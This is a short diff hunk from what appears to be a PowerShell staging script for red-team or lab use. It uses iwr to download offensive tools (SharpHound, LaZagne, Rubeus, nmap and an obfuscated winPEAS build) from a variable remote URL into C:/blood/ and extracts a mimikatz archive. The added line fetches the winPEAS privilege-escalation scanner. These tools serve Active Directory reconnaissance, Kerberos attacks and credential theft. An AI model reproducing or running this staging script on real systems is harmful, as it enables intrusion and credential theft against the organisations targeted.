@@ -24,5 +24,6 @@ iwr $url_1029384756/tools/nmap780_setup.exe  -OutFile C:/blood/nmap780_setup.exe
 iwr $url_1029384756/tools/SharpHound.exe  -OutFile C:/blood/SharpHound.exe
 iwr $url_1029384756/tools/lazagne.exe -OutFile C:/blood/lazagne.exe
 iwr $url_1029384756/tools/Rubeus.exe -OutFile C:/blood/Rubeus.exe
+iwr $url_1029384756/tools/winPEASany_ofs.exe -OutFile C:/blood/winPEASany_ofs.exe
 
 Expand-Archive -LiteralPath 'C:/blood/mimikatz.zip' -DestinationPath 'C:/blood/'
